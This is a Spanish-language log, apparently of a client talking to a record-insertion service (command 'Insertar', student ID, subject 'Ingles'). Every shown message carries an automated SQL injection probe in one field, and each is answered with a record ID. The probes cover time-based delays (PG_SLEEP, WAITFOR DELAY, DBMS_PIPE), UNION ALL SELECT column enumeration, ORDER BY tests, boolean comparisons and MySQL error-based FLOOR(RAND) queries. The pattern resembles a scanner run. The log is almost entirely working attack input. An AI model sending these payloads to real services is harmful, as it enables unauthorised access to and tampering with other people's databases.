+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  766221
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles AND 4066=(SELECT 4066 FROM PG_SLEEP(5)),1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  909696
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles') AND 4066=(SELECT 4066 FROM PG_SLEEP(5)) AND ('foru'='foru,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  511474
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles' AND 4066=(SELECT 4066 FROM PG_SLEEP(5)) AND 'hlsq'='hlsq,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  653888
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles) WAITFOR DELAY '0:0:5'--,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  758927
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles WAITFOR DELAY '0:0:5'--,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  118634
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles') WAITFOR DELAY '0:0:5'--,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  758418
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles' WAITFOR DELAY '0:0:5'--,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  637215
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles) AND 2494=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(106)||CHR(120)||CHR(97),5) AND (5460=5460,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  334561
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles AND 2494=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(106)||CHR(120)||CHR(97),5),1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  299603
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles') AND 2494=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(106)||CHR(120)||CHR(97),5) AND ('rCIu'='rCIu,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  770783
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles' AND 2494=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(106)||CHR(120)||CHR(97),5) AND 'WCul'='WCul,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  226158
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles) ORDER BY 1#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  993116
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles) ORDER BY 2253#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  153386
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  915266
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL, NULL#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  63050
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL, NULL, NULL#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  386477
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  615410
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  22745
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  859401
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  811307
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  233204
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  631167
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  653836
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles ORDER BY 1#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  570051
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles ORDER BY 8935#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  97797
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT NULL#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  652404
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT NULL, NULL#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  243570
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT NULL, NULL, NULL#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  566907
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  661321
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  507961
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  770288
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  728326
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  595325
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  857127
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  83077
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles') ORDER BY 1#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  455739
+2012-05-02 19:34:21 -0500 mensaje enviado: Insertar,A01163951,Ingles') ORDER BY 8701#,1,10
+2012-05-02 19:34:21 -0500 respuesta recibida: Tu id del registro es  86467
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles') UNION ALL SELECT NULL#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  460000
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles') UNION ALL SELECT NULL, NULL#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  472874
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles') UNION ALL SELECT NULL, NULL, NULL#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  785826
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles') UNION ALL SELECT NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  964552
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  469833
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  250000
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  515033
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  281663
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  52541
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  362685
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles' ORDER BY 1#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  610086
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles' ORDER BY 9493#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  137652
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles' UNION ALL SELECT NULL#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  109862
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles' UNION ALL SELECT NULL, NULL#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  49199
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles' UNION ALL SELECT NULL, NULL, NULL#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  727373
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles' UNION ALL SELECT NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  214232
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  840722
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  458257
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  590707
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  781827
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  236243
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  870867
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles) ORDER BY 1-- ,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  136571
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles) ORDER BY 1224-- ,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  205705
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL-- ,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  738437
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL, NULL-- ,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  276587
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  332542
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  634685
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  453363
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  397680
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  886568
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  688774
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  508096
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  862695
+2012-05-02 19:34:22 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT 'rnSsnOidnL', NULL-- ,1,10
+2012-05-02 19:34:22 -0500 respuesta recibida: Tu id del registro es  931155
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles) UNION ALL SELECT NULL, 'fVChEjGUZz'-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  257636
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,-6357) UNION ALL SELECT NULL, 'emAjJhYdSt'-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  826359
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,-8838) UNION ALL SELECT 'EaWRVcXOUF', NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  662606
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles ORDER BY 1-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  38908
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles ORDER BY 7685-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  270222
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  707321
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  108644
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  806480
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  553434
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  876639
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  546126
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  711280
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  366745
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  596964
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  12087
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles UNION ALL SELECT 'LVropzYJFP'-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  105681
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,-9191 UNION ALL SELECT 'GDLAWanmgl'-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  414377
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles') ORDER BY 1-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  818218
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles') ORDER BY 2355-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  520457
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles') UNION ALL SELECT NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  858467
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles') UNION ALL SELECT NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  681833
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles') UNION ALL SELECT NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  825746
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles') UNION ALL SELECT NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  337799
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  559709
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  22365
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  725431
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  994007
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  717053
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  850035
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles' ORDER BY 1-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  844234
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles' ORDER BY 3352-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  560420
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles' UNION ALL SELECT NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  256730
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles' UNION ALL SELECT NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  335189
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles' UNION ALL SELECT NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  777255
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles' UNION ALL SELECT NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  425563
+2012-05-02 19:34:23 -0500 mensaje enviado: Insertar,A01163951,Ingles' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:23 -0500 respuesta recibida: Tu id del registro es  683951
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  991750
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  206539
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  682370
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  201573
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,1,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  174635
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,7012,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  698977
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1"'"))((("),10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  490830
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) AND 3355=4808 AND (1542=1542,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  868895
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) AND 7428=7428 AND (9942=9942,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  946912
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) AND 1466=1456 AND (6439=6439,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  414566
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 AND 5620=8395,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  626097
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 AND 7428=7428,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  910120
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 AND 2727=2704,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  227268
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') AND 4143=6225 AND ('spIS'='spIS,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  251169
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') AND 7428=7428 AND ('KtJF'='KtJF,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  249974
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') AND 5931=3628 AND ('IHzE'='IHzE,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  263473
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' AND 4988=4224 AND 'oYXf'='oYXf,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  493228
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' AND 7428=7428 AND 'nnSS'='nnSS,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  187267
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' AND 6097=7722 AND 'DRfQ'='DRfQ,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  940100
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) AND (SELECT 5036 FROM(SELECT COUNT(*),CONCAT(0x3a6d6c733a,(SELECT (CASE WHEN (5036=5036) THEN 1 ELSE 0 END)),0x3a696a673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (8340=8340,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  440502
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 AND (SELECT 5036 FROM(SELECT COUNT(*),CONCAT(0x3a6d6c733a,(SELECT (CASE WHEN (5036=5036) THEN 1 ELSE 0 END)),0x3a696a673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a),10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  31836
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') AND (SELECT 5036 FROM(SELECT COUNT(*),CONCAT(0x3a6d6c733a,(SELECT (CASE WHEN (5036=5036) THEN 1 ELSE 0 END)),0x3a696a673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('JrYS'='JrYS,10
